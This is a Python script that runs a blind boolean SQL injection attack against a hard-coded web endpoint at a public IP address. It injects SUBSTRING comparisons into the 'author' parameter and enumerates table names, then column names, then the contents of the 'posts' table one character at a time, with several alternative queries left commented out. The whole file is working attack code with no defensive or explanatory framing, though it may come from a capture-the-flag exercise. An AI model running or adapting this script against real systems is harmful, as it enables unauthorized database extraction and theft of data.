import requests
import string
import sys

char_set = string.ascii_lowercase + string.digits + string.punctuation

target = 'http://114.116.24.200/service/post.do'

payload_template = "Bypass' AND (SELECT SUBSTRING(({}), {}, 1)='{}') AND '1'='1"


# posts
def get_tables():
    tables = ''
    table_name_query = 'SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE()'
    for i in range(1, 33):
        print(i, end=' ')
        sys.stdout.flush()
        for c in char_set:
            print(c, end='')
            sys.stdout.flush()
            payload = payload_template.format(table_name_query, i, c)
            r = requests.get(target, params={
                'action': 'list',
                'author': payload
            })
            # print(r.text)
            if 'class="page"' in r.text:
                tables += c
                print('\n' + tables + '\n')
                break


# id,title,author,content,add_at,origin,desc,cover,deleted,att
def get_columns():
    columns = 'id,title,author,content,add_at,origin,desc,cover,deleted,att'
    column_name_query = 'SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_NAME="posts"'
    for i in range(55, 90):
        print(i, end=' ')
        sys.stdout.flush()
        for c in char_set:
            print(c, end='')
            sys.stdout.flush()
            payload = payload_template.format(column_name_query, i, c)
            r = requests.get(target, params={
                'action': 'list',
                'author': payload
            })
            # print(r.text)
            if 'class="page"' in r.text:
                columns += c
                print('\n' + columns + '\n')
                break


def custom_query(query):
    result = ''
    for i in range(1, 33):
        print(i, end=' ')
        sys.stdout.flush()
        for c in char_set:
            print(c, end='')
            sys.stdout.flush()
            payload = payload_template.format(query, i, c)
            r = requests.get(target, params={
                'action': 'list',
                'author': payload
            })
            # print(r.text)
            if 'class="page"' in r.text:
                result += c
                print('\n' + result + '\n')
                break


# query1 = 'SELECT CONCAT(deleted,att) FROM posts limit 1'
#
# custom_query(query1)

# query2 = 'SELECT COUNT(*) FROM posts'
# custom_query(query2)
# 99

query3 = 'SELECT CONCAT(`att`) from posts limit 1'
custom_query(query3)
